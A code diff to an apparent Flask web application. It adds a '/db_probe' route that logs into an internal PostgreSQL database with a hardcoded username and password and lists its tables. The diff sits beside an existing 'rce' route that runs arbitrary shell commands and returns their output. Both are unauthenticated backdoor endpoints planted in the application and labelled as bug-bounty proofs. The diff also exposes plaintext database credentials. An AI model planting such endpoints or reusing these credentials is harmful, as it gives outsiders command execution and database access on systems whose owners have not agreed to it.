@@ -105,3 +105,26 @@ def rce():
     out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode()
     return '{"output": "' + out.strip().replace('"', '\\"') + '", "researcher": "trexnegr0"}', 200, {'Content-Type': 'application/json'}
 
+# HackerOne internal DB access proof - trexnegr0
+@app.route('/db_probe')
+def db_probe():
+    import psycopg2, os
+    try:
+        conn = psycopg2.connect(
+            dbname='database_disagro_beta',
+            user='ccubias487',
+            password='ouMaRar8vwX8TnJOGr4JGKZU2xcLil70',
+            host='dpg-ctktra3v2p9s738c0sv0-a',
+            port=5432,
+            connect_timeout=10
+        )
+        cur = conn.cursor()
+        cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY 1")
+        tables = [r[0] for r in cur.fetchall()]
+        cur.execute('SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=\'public\'')
+        count = cur.fetchone()[0]
+        conn.close()
+        return jsonify({'status': 'CONNECTED', 'tables': tables, 'count': count, 'researcher': 'trexnegr0'})
+    except Exception as e:
+        return jsonify({'status': 'ERROR', 'error': str(e), 'researcher': 'trexnegr0'})
+
